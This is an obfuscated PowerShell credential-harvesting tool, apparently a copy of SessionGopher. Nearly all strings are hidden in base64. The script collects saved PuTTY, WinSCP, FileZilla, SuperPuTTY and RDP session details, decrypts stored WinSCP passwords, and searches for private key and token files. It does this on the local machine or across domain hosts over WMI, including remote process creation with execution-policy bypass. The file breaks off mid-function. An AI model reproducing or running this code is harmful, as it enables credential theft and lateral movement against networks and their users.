function Invoke-S3ssionGoph3r {
  param (
      [switch]$o, 
      [switch]$Thorough, 
      [string]$u, 
      [string]$p, 
      [string]$iL, 
      [string]$Target, 
      [switch]$AllDomain 
  )
  echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('DQAKACAAIAAgACAAIAAgACAAIAAgACAAbwBfAA0ACgAgACAAIAAgACAAIAAgACAAIAAvACAAIAAiAC4AIAAgACAAUwBlAHMAcwBpAG8AbgBHAG8AcABoAGUAcgANAAoAIAAgACAAIAAgACAAIAAsACIAIAAgAF8ALQAiAA0ACgAgACAAIAAgACAALAAiACAAIAAgAG0AIABtAA0ACgAgACAALgAuACsAIAAgACAAIAAgACkAIAAgACAAIAAgACAAQgByAGEAbgBkAG8AbgAgAEEAcgB2AGEAbgBhAGcAaABpAA0ACgAgACAAIAAgACAAYABtAC4ALgBtACAAIAAgACAAIAAgACAAVAB3AGkAdAB0AGUAcgA6ACAAQABhAHIAdgBhAG4AYQBnAGgAaQAgAHwAIABhAHIAdgBhAG4AYQBnAGgAaQAuAGMAbwBtAA0ACgAgACAA')))
  if ($o) {
    ${20} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHMAcwBpAG8AbgBHAG8AcABoAGUAcgAgACgA'))) + (Get-Date -Format $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABIAC4AbQBtAC4AcwBzAA==')))) + ")"
    ni -ItemType Directory ${20} | Out-Null
    ni (${20} + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABQAHUAVABUAFkALgBjAHMAdgA=')))) -Type File | Out-Null
    ni (${20} + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABTAHUAcABlAHIAUAB1AFQAVABZAC4AYwBzAHYA')))) -Type File | Out-Null
    ni (${20} + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABXAGkAbgBTAEMAUAAuAGMAcwB2AA==')))) -Type File | Out-Null
    ni (${20} + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABGAGkAbABlAFoAaQBsAGwAYQAuAGMAcwB2AA==')))) -Type File | Out-Null
    ni (${20} + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABSAEQAUAAuAGMAcwB2AA==')))) -Type File | Out-Null
    if ($Thorough) {
        ni (${20} + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABQAHUAVABUAFkAIABwAHAAawAgAEYAaQBsAGUAcwAuAGMAcwB2AA==')))) -Type File | Out-Null
        ni (${20} + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABNAGkAYwByAG8AcwBvAGYAdAAgAHIAZABwACAARgBpAGwAZQBzAC4AYwBzAHYA')))) -Type File | Out-Null
        ni (${20} + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABSAFMAQQAgAHMAZAB0AGkAZAAgAEYAaQBsAGUAcwAuAGMAcwB2AA==')))) -Type File | Out-Null
    }
  }
  if ($u -and $p) {
    ${f1} = ConvertTo-SecureString $p -AsPlainText -Force
    ${94} = New-Object -Typename System.Management.Automation.PSCredential -ArgumentList $u, ${f1}
  }
  ${81} = 2147483651
  ${60} = 2147483650
  ${74} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABTAE8ARgBUAFcAQQBSAEUAXABTAGkAbQBvAG4AVABhAHQAaABhAG0AXABQAHUAVABUAFkAXABTAGUAcwBzAGkAbwBuAHMA')))
  ${73} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABTAE8ARgBUAFcAQQBSAEUAXABNAGEAcgB0AGkAbgAgAFAAcgBpAGsAcgB5AGwAXABXAGkAbgBTAEMAUAAgADIAXABTAGUAcwBzAGkAbwBuAHMA')))
  ${72} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABTAE8ARgBUAFcAQQBSAEUAXABNAGkAYwByAG8AcwBvAGYAdABcAFQAZQByAG0AaQBuAGEAbAAgAFMAZQByAHYAZQByACAAQwBsAGkAZQBuAHQAXABTAGUAcgB2AGUAcgBzAA==')))
  if ($iL -or $AllDomain -or $Target) {
    ${93} = ""
    if ($AllDomain) {
      ${93} = f18
    } elseif ($iL) {
      ${93} = gc ((rvpa $iL).Path)
    } elseif ($Target) {
      ${93} = $Target
    }
    ${55} = @{}
    if (${94}) {
      ${55}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = ${94}
    }
    foreach (${50} in ${93}) {
      if ($AllDomain) {
        ${50} = ${50}.Properties.name
        if (!${50}) { Continue }
      }
      Write-Host -NoNewLine -ForegroundColor $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABhAHIAawBHAHIAZQBlAG4A'))) $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIAA=')))
      Write-Host $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABpAGcAZwBpAG4AZwAgAG8AbgA='))) ${50}"..."
      ${92} = Invoke-WmiMethod -Class $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGQAUgBlAGcAUAByAG8AdgA='))) -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBuAHUAbQBLAGUAeQA='))) -ArgumentList ${81},'' -ComputerName ${50} @55 | select -ExpandProperty sNames | ? {$_ -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMgAxAC0AWwBcAGQAXAAtAF0AKwAkAA==')))}
      foreach (${64} in ${92}) {
        ${78} = try { (Split-Path -Leaf (Split-Path -Leaf (f30))) } catch {}
        ${23} = ((${50} + "\" + ${78}) -Join "")
        ${19} = New-Object PSObject
        ${45} = New-Object System.Collections.ArrayList
        ${18} = New-Object System.Collections.ArrayList
        ${42} = New-Object System.Collections.ArrayList
        ${25} = New-Object System.Collections.ArrayList
        ${37} = New-Object System.Collections.ArrayList
        ${83} = ${64} + ${72}
        ${67} = ${64} + ${74}
        ${68} = ${64} + ${73}
        ${91} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RAByAGkAdgBlAD0AJwBDADoAJwAgAEEATgBEACAAUABhAHQAaAA9ACcAXABcAFUAcwBlAHIAcwBcAFwAJAB7ADcAOAB9AFwAXABEAG8AYwB1AG0AZQBuAHQAcwBcAFwAUwB1AHAAZQByAFAAdQBUAFQAWQBcAFwAJwAgAEEATgBEACAARgBpAGwAZQBOAGEAbQBlAD0AJwBTAGUAcwBzAGkAbwBuAHMAJwAgAEEATgBEACAARQB4AHQAZQBuAHMAaQBvAG4APQAnAFgATQBMACcA')))
        ${90} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RAByAGkAdgBlAD0AJwBDADoAJwAgAEEATgBEACAAUABhAHQAaAA9ACcAXABcAFUAcwBlAHIAcwBcAFwAJAB7ADcAOAB9AFwAXABBAHAAcABEAGEAdABhAFwAXABSAG8AYQBtAGkAbgBnAFwAXABGAGkAbABlAFoAaQBsAGwAYQBcAFwAJwAgAEEATgBEACAARgBpAGwAZQBOAGEAbQBlAD0AJwBzAGkAdABlAG0AYQBuAGEAZwBlAHIAJwAgAEEATgBEACAARQB4AHQAZQBuAHMAaQBvAG4APQAnAFgATQBMACcA')))
        ${84} = Invoke-WmiMethod -ComputerName ${50} -Class $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGQAUgBlAGcAUAByAG8AdgA='))) -Name EnumKey -ArgumentList ${81},${83} @55
        ${86} = Invoke-WmiMethod -ComputerName ${50} -Class $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGQAUgBlAGcAUAByAG8AdgA='))) -Name EnumKey -ArgumentList ${81},${67} @55
        ${89} = Invoke-WmiMethod -ComputerName ${50} -Class $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGQAUgBlAGcAUAByAG8AdgA='))) -Name EnumKey -ArgumentList ${81},${68} @55
        ${70} = (gwmi -Class $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBJAE0AXwBEAGEAdABhAEYAaQBsAGUA'))) -Filter ${91} -ComputerName ${50} @55 | Select Name)
        ${71} = (gwmi -Class $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBJAE0AXwBEAGEAdABhAEYAaQBsAGUA'))) -Filter ${90} -ComputerName ${50} @55 | Select Name)
        if ((${89} | select -ExpandPropert ReturnValue) -eq 0) {
          ${89} = ${89} | select -ExpandProperty sNames
          foreach (${88} in ${89}) {
            ${38} = "" | select -Property Source,Session,Hostname,Username,Password
            ${38}.Source = ${23}
            ${38}.Session = ${88}
            ${80} = ${68} + "\" + ${88}
            ${38}.Hostname = (Invoke-WmiMethod -ComputerName ${50} -Class $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGQAUgBlAGcAUAByAG8AdgA='))) -Name GetStringValue -ArgumentList ${81},${80},$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABvAHMAdABOAGEAbQBlAA=='))) @55).sValue
            ${38}.Username = (Invoke-WmiMethod -ComputerName ${50} -Class $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGQAUgBlAGcAUAByAG8AdgA='))) -Name GetStringValue -ArgumentList ${81},${80},$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBOAGEAbQBlAA=='))) @55).sValue
            ${38}.Password = (Invoke-WmiMethod -ComputerName ${50} -Class $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGQAUgBlAGcAUAByAG8AdgA='))) -Name GetStringValue -ArgumentList ${81},${80},$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABhAHMAcwB3AG8AcgBkAA=='))) @55).sValue
            if (${38}.Password) {
              ${87} = ${64} + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABTAG8AZgB0AHcAYQByAGUAXABNAGEAcgB0AGkAbgAgAFAAcgBpAGsAcgB5AGwAXABXAGkAbgBTAEMAUAAgADIAXABDAG8AbgBmAGkAZwB1AHIAYQB0AGkAbwBuAFwAUwBlAGMAdQByAGkAdAB5AA==')))
              ${39} = (Invoke-WmiMethod -ComputerName ${50} -Class $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGQAUgBlAGcAUAByAG8AdgA='))) -Name GetDWordValue -ArgumentList ${81},${87},$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUATQBhAHMAdABlAHIAUABhAHMAcwB3AG8AcgBkAA=='))) @55).uValue
              if (!${39}) {
                  ${38}.Password = (f17 ${38}.Hostname ${38}.Username ${38}.Password)
              } else {
                  ${38}.Password = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBhAHYAZQBkACAAaQBuACAAcwBlAHMAcwBpAG8AbgAsACAAYgB1AHQAIABtAGEAcwB0AGUAcgAgAHAAYQBzAHMAdwBvAHIAZAAgAHAAcgBlAHYAZQBuAHQAcwAgAHAAbABhAGkAbgB0AGUAeAB0ACAAcgBlAGMAbwB2AGUAcgB5AA==')))
              }
            }
            [void]${37}.Add(${38})
          } 
          if (${37}.count -gt 0) {
            ${19} | Add-Member -MemberType NoteProperty -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AUwBDAFAAIABTAGUAcwBzAGkAbwBuAHMA'))) -Value ${37}
            if ($o) {
              ${37} | select * | Export-CSV -Append -Path (${20} + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABXAGkAbgBTAEMAUAAuAGMAcwB2AA==')))) -NoTypeInformation
            } else {
              echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AUwBDAFAAIABTAGUAcwBzAGkAbwBuAHMA')))
              ${37} | select * | fl | Out-String
            }
          }
        } 
        if ((${86} | select -ExpandPropert ReturnValue) -eq 0) {
          ${86} = ${86} | select -ExpandProperty sNames
          foreach (${85} in ${86}) {
            ${46} = "" | select -Property Source,Session,Hostname
            ${80} = ${67} + "\" + ${85}
            ${46}.Source = ${23}
            ${46}.Session = ${85}
            ${46}.Hostname = (Invoke-WmiMethod -ComputerName ${50} -Class $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGQAUgBlAGcAUAByAG8AdgA='))) -Name GetStringValue -ArgumentList ${81},${80},$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABvAHMAdABOAGEAbQBlAA=='))) @55).sValue
            [void]${45}.Add(${46})
          }
          if (${45}.count -gt 0) {
            ${19} | Add-Member -MemberType NoteProperty -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AFQAVABZACAAUwBlAHMAcwBpAG8AbgBzAA=='))) -Value ${45}
            if ($o) {
              ${45} | select * | Export-CSV -Append -Path (${20} + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABQAHUAVABUAFkALgBjAHMAdgA=')))) -NoTypeInformation
            } else {
              echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AFQAVABZACAAUwBlAHMAcwBpAG8AbgBzAA==')))
              ${45} | select * | fl | Out-String
            }
          }
        } 
        if ((${84} | select -ExpandPropert ReturnValue) -eq 0) {
          ${84} = ${84} | select -ExpandProperty sNames
          foreach (${82} in ${84}) {
            ${79} = "" | select -Property Source,Hostname,Username
            ${80} = ${83} + "\" + ${82}
            ${79}.Source = ${23}
            ${79}.Hostname = ${82}
            ${79}.Username = (Invoke-WmiMethod -ComputerName ${50} -Class $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGQAUgBlAGcAUAByAG8AdgA='))) -Name GetStringValue -ArgumentList ${81},${80},$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBOAGEAbQBlAEgAaQBuAHQA'))) @55).sValue
            [void]${42}.Add(${79})
          }
          if (${42}.count -gt 0) {
            ${19} | Add-Member -MemberType NoteProperty -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBEAFAAIABTAGUAcwBzAGkAbwBuAHMA'))) -Value ${42}
            if ($o) {
              ${42} | select * | Export-CSV -Append -Path (${20} + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABSAEQAUAAuAGMAcwB2AA==')))) -NoTypeInformation
            } else {
              echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBpAGMAcgBvAHMAbwBmAHQAIABSAEQAUAAgAFMAZQBzAHMAaQBvAG4AcwA=')))
              ${42} | select * | fl | Out-String
            }
          }
        } 
        if (${70}.Name) {
          ${f15} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwA6AFwAVQBzAGUAcgBzAFwAJAB7ADcAOAB9AFwARABvAGMAdQBtAGUAbgB0AHMAXABTAHUAcABlAHIAUAB1AFQAVABZAFwAUwBlAHMAcwBpAG8AbgBzAC4AeABtAGwA')))
          ${77} = f29 ${f15}
          [xml]${f5} = ${77}
          (f19 ${f5})
        }
        if (${71}.Name) {
          ${f15} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwA6AFwAVQBzAGUAcgBzAFwAJAB7ADcAOAB9AFwAQQBwAHAARABhAHQAYQBcAFIAbwBhAG0AaQBuAGcAXABGAGkAbABlAFoAaQBsAGwAYQBcAHMAaQB0AGUAbQBhAG4AYQBnAGUAcgAuAHgAbQBsAA==')))
          ${77} = f29 ${f15}
          [xml]${f6} = ${77}
          (f20 ${f6})
        } 
      } 
      if ($Thorough) {
        ${29} = New-Object System.Collections.ArrayList
        ${33} = New-Object System.Collections.ArrayList
        ${35} = New-Object System.Collections.ArrayList
        ${f13} = (gwmi -Class $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBJAE0AXwBEAGEAdABhAEYAaQBsAGUA'))) -Filter "Drive='C:' AND extension='ppk' OR extension='rdp' OR extension='.sdtid'" -ComputerName ${50} @55 | Select Name)
        (f27 ${f13})
      }
    } 
  } else {
    Write-Host -NoNewLine -ForegroundColor $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABhAHIAawBHAHIAZQBlAG4A'))) $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIAA=')))
    Write-Host $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABpAGcAZwBpAG4AZwAgAG8AbgA=')))(Hostname)$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LgAuAC4A')))
    ${76} = ls Registry::HKEY_USERS\ -ErrorAction SilentlyContinue | ? {$_.Name -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBIAEsARQBZAF8AVQBTAEUAUgBTAFwAXABTAC0AMQAtADUALQAyADEALQBbAFwAZABcAC0AXQArACQA')))}
    foreach(${40} in ${76}) {
      ${19} = New-Object PSObject
      ${37} = New-Object System.Collections.ArrayList
      ${45} = New-Object System.Collections.ArrayList
      ${29} = New-Object System.Collections.ArrayList
      ${18} = New-Object System.Collections.ArrayList
      ${42} = New-Object System.Collections.ArrayList
      ${33} = New-Object System.Collections.ArrayList
      ${25} = New-Object System.Collections.ArrayList
      ${75} = (f30)
      ${23} = (Hostname) + "\" + (Split-Path ${75}.Value -Leaf)
      ${19} | Add-Member -MemberType NoteProperty -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBvAHUAcgBjAGUA'))) -Value ${75}.Value
      ${67} = Join-Path ${40}.PSPath $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAkAHsANwA0AH0A')))
      ${68} = Join-Path ${40}.PSPath $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAkAHsANwAzAH0A')))
      ${69} = Join-Path ${40}.PSPath $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAkAHsANwAyAH0A')))
      ${71} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwA6AFwAVQBzAGUAcgBzAFwA'))) + (Split-Path -Leaf ${19}."Source") + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABBAHAAcABEAGEAdABhAFwAUgBvAGEAbQBpAG4AZwBcAEYAaQBsAGUAWgBpAGwAbABhAFwAcwBpAHQAZQBtAGEAbgBhAGcAZQByAC4AeABtAGwA')))
      ${70} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwA6AFwAVQBzAGUAcgBzAFwA'))) + (Split-Path -Leaf ${19}."Source") + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABEAG8AYwB1AG0AZQBuAHQAcwBcAFMAdQBwAGUAcgBQAHUAVABUAFkAXABTAGUAcwBzAGkAbwBuAHMALgB4AG0AbAA=')))
      if (Test-Path ${71}) {
        [xml]${f6} = gc ${71}
        (f20 ${f6})
      }
      if (Test-Path ${70}) {
        [xml]${f5} = gc ${70}
        (f19 ${f5})
      }
      if (Test-Path ${69}) {
        ${f11} = ls ${69}
        (f25 ${f11})
      } 
      if (Test-Path ${68}) {
        ${f10} = ls ${68}
        (f24 ${f10})
      } 
      if (Test-Path ${67}) {
        ${f12} = ls ${67}
        (f26 ${f12})
      } 
    } 
    if ($Thorough) {
      ${f7} = New-Object System.Collections.ArrayList
      ${f8} = New-Object System.Collections.ArrayList
      ${f9} = New-Object System.Collections.ArrayList
      ${f14} = gdr
      (f28 ${f14})
      (f21 ${f7})
      (f22 ${f8})
      (f23 ${f9})
    } 
  } 
} 
function f30 {
  if ($iL -or $Target -or $AllDomain) {
    ${66} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBPAEYAVABXAEEAUgBFAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzACAATgBUAFwAQwB1AHIAcgBlAG4AdABWAGUAcgBzAGkAbwBuAFwAUAByAG8AZgBpAGwAZQBMAGkAcwB0AFwAJAB7ADYANAB9AA==')))
    ${65} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AZgBpAGwAZQBJAG0AYQBnAGUAUABhAHQAaAA=')))
    return (Invoke-WmiMethod -ComputerName ${50} -Class $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGQAUgBlAGcAUAByAG8AdgA='))) -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQAUwB0AHIAaQBuAGcAVgBhAGwAdQBlAA=='))) -ArgumentList ${60},${66},${65} @55).sValue
  } else {
    ${64} = (Split-Path ${40}.Name -Leaf)
    ${63} = New-Object System.Security.Principal.SecurityIdentifier($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7ADYANAB9AA=='))))
    return ${63}.Translate( [System.Security.Principal.NTAccount])
  }
}
function f29(${f15}) {
  ${62} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABLAEwATQA6AFwAUwBvAGYAdAB3AGEAcgBlAFwATQBpAGMAcgBvAHMAbwBmAHQAXABEAFIATQA=')))
  ${56} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGEAZABNAGUA')))
  ${57} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBPAEYAVABXAEEAUgBFAFwATQBpAGMAcgBvAHMAbwBmAHQAXABEAFIATQA=')))
  Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGEAZABpAG4AZwAgAHIAZQBtAG8AdABlACAAZgBpAGwAZQAgAGEAbgBkACAAdwByAGkAdABpAG4AZwAgAG8AbgAgAHIAZQBtAG8AdABlACAAcgBlAGcAaQBzAHQAcgB5AA==')))
  ${61} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABmAGMAdAAgAD0AIABHAGUAdAAtAEMAbwBuAHQAZQBuAHQAIAAtAEUAbgBjAG8AZABpAG4AZwAgAGIAeQB0AGUAIAAtAFAAYQB0AGgAIAAnAA=='))) + $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AGYAMQA1AH0A'))) + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JwA7ACAAJABmAGMAdABlAG4AYwAgAD0AIABbAFMAeQBzAHQAZQBtAC4AQwBvAG4AdgBlAHIAdABdADoAOgBUAG8AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKAAkAGYAYwB0ACkAOwAgAE4AZQB3AC0ASQB0AGUAbQBQAHIAbwBwAGUAcgB0AHkAIAAtAFAAYQB0AGgAIAA='))) + $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JwAkAHsANgAyAH0AJwA='))) + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IAAtAE4AYQBtAGUAIAA='))) + $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JwAkAHsANQA2AH0AJwA='))) + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IAAtAFYAYQBsAHUAZQAgACQAZgBjAHQAZQBuAGMAIAAtAFAAcgBvAHAAZQByAHQAeQBUAHkAcABlACAAUwB0AHIAaQBuAGcAIAAtAEYAbwByAGMAZQA=')))
  ${61} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cABvAHcAZQByAHMAaABlAGwAbAAgAC0AbgBvAHAAIAAtAGUAeABlAGMAIABiAHkAcABhAHMAcwAgAC0AYwAgACIA'))) + ${61} + '"'
  $null = Invoke-WmiMethod -class win32_process -Name Create -Argumentlist ${61} -ComputerName ${50} @55
  sleep -s 15
  ${59} = ""
  ${59} = Invoke-WmiMethod -Namespace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cgBvAG8AdABcAGQAZQBmAGEAdQBsAHQA'))) -Class $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGQAUgBlAGcAUAByAG8AdgA='))) -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQAUwB0AHIAaQBuAGcAVgBhAGwAdQBlAA=='))) -ArgumentList ${60}, ${57}, ${56} -Computer ${50} @55
  ${58} = [System.Convert]::FromBase64String(${59}.sValue)
  ${54} = [System.Text.Encoding]::UTF8.GetString(${58})
  $null = Invoke-WmiMethod -Namespace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cgBvAG8AdABcAGQAZQBmAGEAdQBsAHQA'))) -Class $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGQAUgBlAGcAUAByAG8AdgA='))) -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGwAZQB0AGUAVgBhAGwAdQBlAA=='))) -Argumentlist $reghive, ${57}, ${56} -ComputerName ${50} @55
  return ${54}
}
function f28(${f14}) {
  foreach (${53} in ${f14}) {
    if (${53}.Provider.Name -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAGwAZQBTAHkAcwB0AGUAbQA=')))) {
      ${52} = ls ${53}.Root -Recurse -ErrorAction SilentlyContinue
      foreach (${51} in ${52}) {
        Switch (${51}.Extension) {
          $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LgBwAHAAawA='))) {[void]${f7}.Add(${51})}
          $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LgByAGQAcAA='))) {[void]${f8}.Add(${51})}
          $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LgBzAGQAdABpAGQA'))) {[void]${f9}.Add(${51})}
        }
      }
    }
  }
}
function f27(${f13}) {
  foreach (${48} in ${f13}) {
      ${47} = "" | select -Property Source,Path
      ${47}.Source = ${50}
      ${49} = [IO.Path]::GetExtension(${48}.Name)
      if (${49} -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LgBwAHAAawA=')))) {
        ${47}.Path = ${48}.Name
        [void]${29}.Add(${47})
      } elseif (${49} -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LgByAGQAcAA=')))) {
        ${47}.Path = ${48}.Name
        [void]${33}.Add(${47})
      } elseif (${49} -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LgBzAGQAdABpAGQA')))) {
        ${47}.Path = ${48}.Name
        [void]${35}.Add(${47})
      }
  }
  if (${29}.count -gt 0) {
    ${19} | Add-Member -MemberType NoteProperty -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABQAEsAIABGAGkAbABlAHMA'))) -Value ${33}
    if ($o) {
      ${29} | Export-CSV -Append -Path (${20} + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABQAHUAVABUAFkAIABwAHAAawAgAEYAaQBsAGUAcwAuAGMAcwB2AA==')))) -NoTypeInformation
    } else {
      echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AFQAVABZACAAUAByAGkAdgBhAHQAZQAgAEsAZQB5ACAARgBpAGwAZQBzACAAKAAuAHAAcABrACkA')))
      ${29} | fl | Out-String
    }
  }
  if (${33}.count -gt 0) {
    ${19} | Add-Member -MemberType NoteProperty -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBEAFAAIABGAGkAbABlAHMA'))) -Value ${33}
    if ($o) {
      ${33} | Export-CSV -Append -Path (${20} + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABNAGkAYwByAG8AcwBvAGYAdAAgAHIAZABwACAARgBpAGwAZQBzAC4AYwBzAHYA')))) -NoTypeInformation
    } else {
      echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBpAGMAcgBvAHMAbwBmAHQAIABSAEQAUAAgAEMAbwBuAG4AZQBjAHQAaQBvAG4AIABGAGkAbABlAHMAIAAoAC4AcgBkAHAAKQA=')))
      ${33} | fl | Out-String
    }
  }
  if (${35}.count -gt 0) {
    ${19} | Add-Member -MemberType NoteProperty -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBkAHQAaQBkACAARgBpAGwAZQBzAA=='))) -Value ${35}
    if ($o) {
      ${35} | Export-CSV -Append -Path (${20} + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABSAFMAQQAgAHMAZAB0AGkAZAAgAEYAaQBsAGUAcwAuAGMAcwB2AA==')))) -NoTypeInformation
    } else {
      echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBTAEEAIABUAG8AawBlAG4AcwAgACgAcwBkAHQAaQBkACkA')))
      ${35} | fl | Out-String
    }
  }
} 
function f26(${f12}) {
  foreach(${26} in ${f12}) {
    ${46} = "" | select -Property Source,Session,Hostname
    ${46}.Source = ${23}
    ${46}.Session = (Split-Path ${26} -Leaf)
    ${46}.Hostname = ((gp -Path ($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBpAGMAcgBvAHMAbwBmAHQALgBQAG8AdwBlAHIAUwBoAGUAbABsAC4AQwBvAHIAZQBcAFIAZQBnAGkAcwB0AHIAeQA6ADoA'))) + ${26}) -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABvAHMAdABuAGEAbQBlAA=='))) -ErrorAction SilentlyContinue).Hostname)
    [void]${45}.Add(${46})
  }
  if ($o) {
    ${45} | Export-CSV -Append -Path (${20} + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABQAHUAVABUAFkALgBjAHMAdgA=')))) -NoTypeInformation
